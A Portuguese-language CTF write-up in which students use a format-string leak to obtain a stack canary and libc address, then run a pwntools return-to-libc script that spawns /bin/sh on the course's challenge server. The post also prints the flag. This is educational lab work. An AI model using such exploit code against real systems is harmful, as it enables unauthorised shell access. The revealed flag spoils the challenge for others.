Primeiro, utilizamos ```checksec``` no ```program```:

<img width="355" alt="Screenshot 2023-06-04 at 18 31 37" src="https://github.com/DCC-FCUP-SP/sp2223-t01g06/assets/98234753/308938bf-4306-440d-a5d4-aebf50f638a0">

Verificamos que todas as proteções estão ativas.

Como foi indicado neste desafio "Não te esqueças, não há nada totalmente seguro." Então começamos por ultrapassar o máximo de caracteres permitidos, neste caso o máximo era 20.

<img width="899" alt="Screenshot 2023-06-04 at 18 37 11" src="https://github.com/DCC-FCUP-SP/sp2223-t01g06/assets/98234753/e1992e5f-254b-4ca3-a424-e1c28c27d6cc">

Com isto verificamos que ```stack smashing detected```, indicando então que o ```program``` não verifica o número máximo de caracteres, esperando que o canary faça essa confirmação.

Após fazermos debugging ao ```program```, descobrimos algo que não é nada normal. A função ```fgets``` está a ler 100 caracteres, em vez dos supostos 20 caracteres. Então suspeitamos que existe alguma vulnerabildade em strings.

Confirmando a nossa suposição:

<img width="507" alt="Screenshot 2023-06-04 at 18 38 09" src="https://github.com/DCC-FCUP-SP/sp2223-t01g06/assets/98234753/287af3d6-ad3c-424e-9edc-45d5f2242a19">

Como conseguimos imprimir a informação da stack, confirmamos que as nossas suspeitas estavam corretas.

Acabamos por descobrir depois de alguma pesquisa que este ataque é chamado de ```Return-to-libc``` (https://en.wikipedia.org/wiki/Return-to-libc_attack). Então criamos um script para esse ataque:

```python
from pwn import *

LOCAL = False

# Offset de referência da biblioteca
reference_lib_offset = 0xf7daa519 - 0xf7d89000
# Offset da função system na biblioteca
system_lib_offset = 0x48150
# Offset da string "/bin/sh" na biblioteca
sh_lib_offset = 0x1bd0f5

def send_message(p, message):
    p.recvuntil(b">")
    p.sendline(b"e")
    p.recvuntil(b"Insert your name (max 20 chars): ")
    p.sendline(message)
    answer = p.recvline()
    p.recvuntil(b"Insert your message: ")
    p.sendline(b"")
    return answer

if LOCAL:
    pause()
else:
    p = remote("ctf-sp.dcc.fc.up.pt", 4002)

# Envia a primeira mensagem para obter o valor do canário e um valor de referência
first_message = send_message(p, b"%8$x-%11$x")

canary, reference_val = [int(val, 16) for val in first_message.split(b'-')]

# Calcula a base da biblioteca
lib_base = reference_val - reference_lib_offset
# Calcula os endereços da função system e da string "/bin/sh"
address_system = lib_base + system_lib_offset
address_sh = lib_base + sh_lib_offset

# Monta a segunda mensagem com os valores calculados
second_message = flat(b"A"*20, canary + 1, b"A"*8, address_system, b"A"*4, address_sh)

send_message(p, second_message)

send_message(p, b"A"*19)

p.interactive()
```

Após executarmos ```python3 script.py```, finalmente obtemos a flag: **flag{446742e444cf864d5d85fa643112492a}**

<img width="606" alt="Screenshot 2023-06-04 at 18 38 52" src="https://github.com/DCC-FCUP-SP/sp2223-t01g06/assets/98234753/073ee602-1c6b-460b-9b86-3baf00c67159">
